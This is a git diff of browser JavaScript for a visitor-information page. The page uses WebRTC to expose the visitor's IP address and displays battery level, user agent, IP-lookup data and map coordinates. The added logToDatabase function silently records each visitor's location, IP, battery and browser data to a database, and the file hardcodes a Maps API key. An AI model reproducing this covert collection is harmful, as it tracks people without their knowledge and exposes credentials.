@@ -6,6 +6,9 @@ var latitude = 0;
 var longitude = 0;
 var IPv4;
 var BatteryLevel;
+var _data;
+
+config();
 
 var findIP = new Promise(r => { var w = window, a = new (w.RTCPeerConnection || w.mozRTCPeerConnection || w.webkitRTCPeerConnection)({ iceServers: [] }), b = () => { }; a.createDataChannel(""); a.createOffer(c => a.setLocalDescription(c, b, b), b); a.onicecandidate = c => { try { c.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g).forEach(r) } catch (e) { } } })
 
@@ -23,6 +26,7 @@ function showLoc()
 {
     document.getElementById("lat").innerText = latitude;
     document.getElementById("lng").innerText = longitude;
+    logToDatabase();
 }
 
 function initMap() {
@@ -85,7 +89,19 @@ function loadScript(url, callback) {
     head.appendChild(script);
 }
 
+function logToDatabase()
+{
+    var items = _data;
+    items.latitude = latitude;
+    items.longitude = longitude;
+    items.BatteryLevel = BatteryLevel;
+    items.ipv4 = IPv4;
+    items.browser = window.navigator.userAgent;
+    writeUserData(IPv4, items);
+}
+
 $.getJSON('https://ipapi.co/json/', function (data) {
+    _data = data;
     addTableItem("IPv4", IPv4);
     addTableItem("Battery:", (BatteryLevel * 100) + "%");
     addTableItem("Browser:", window.navigator.userAgent);
@@ -100,8 +116,5 @@ $.getJSON('https://ipapi.co/json/', function (data) {
     console.log(latitude);
     buildTable(data);
     console.log(JSON.stringify(data, null, 2));
-    loadScript("https://maps.googleapis.com/maps/api/js?key=AIzaSyCpNfnlmtCTyoPYnyN5YRYjGpQ8AzOCjBc&callback=initMap",
-
-        function () {
-        });
+    loadScript("https://maps.googleapis.com/maps/api/js?key=AIzaSyCpNfnlmtCTyoPYnyN5YRYjGpQ8AzOCjBc&callback=initMap",function () {});
 });
